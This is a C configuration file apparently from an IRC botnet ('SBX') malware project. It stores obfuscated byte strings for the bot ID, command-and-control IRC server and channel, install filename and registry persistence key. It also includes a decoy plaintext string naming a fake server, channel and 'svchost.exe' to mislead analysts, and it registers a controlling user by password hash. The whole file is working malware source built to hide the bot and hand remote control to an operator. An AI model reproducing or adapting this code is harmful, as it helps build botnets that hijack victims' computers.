#include "../Inc/SBX.h"
#include "../Inc/config.h"

// Use the tool "SBX.0x00.SC.exe" in the tools folder to crypt your settings.

char FakeShit[] = "irc.bluehell.org....#b0tn3t....ch4nn3lp4$$....B0tp4$$!....svchost.exe";

// Crypt key
int  key			= 21;
char bfkey		[]	= "\x38\x39\x39\x37\x00";

char botid		[]	= "\x45\x55\x40\x37\x2A\x63\x2C\x2D\x00";
char server		[]	= "\x7F\x65\x7B\x37\x6C\x74\x75\x71\x7F\x31\x46\x53\x00";
char serverpass	[]	= "\x00";
int  serverport		= 6667;
char channel	[]	= "\x35\x65\x77\x7F\x7C\x7E\x70\x00";
char chanpass	[]	= "\x00";
char filename	[]	= "\x61\x7E\x76\x6A\x6C\x78\x32\x78\x66\x7A\x00";
char regkey		[]  = "\x41\x7E\x76\x7D\x75\x6C\x6F\x3D\x4D\x7A\x52\x57\x4B\x40\x41\x00";
char cmdprefix		= '.';

void SetupConfig ()
{
	xGuard;
	Main->Crypt->SCrypt(bfkey);
	Main->Crypt->SCrypt(botid);
	Main->Crypt->SCrypt(server);
	Main->Crypt->SCrypt(serverpass);
	Main->Crypt->SCrypt(channel);
	Main->Crypt->SCrypt(chanpass);
	Main->Crypt->SCrypt(filename);
	Main->Crypt->SCrypt(regkey);
	Main->Crypt->SetBFKey(bfkey);
	// First param = login name (crypted), second is md5 of password, thired is the auth hostmask (*!@*.*) (crypted too)
	Main->Mac->AddUser("\x77\x7A\x73", "9cdfb439c7876e703e307864c9167a15", "\x3C\x36\x32\x59\x30\x35\x36\x00");
	// Adds a bad function, wich teh user can't execute.
	Main->Mac->AddFunc("rem", Main->Mac->FindUser("amk"));
	xUnguard("SetupConfig");
}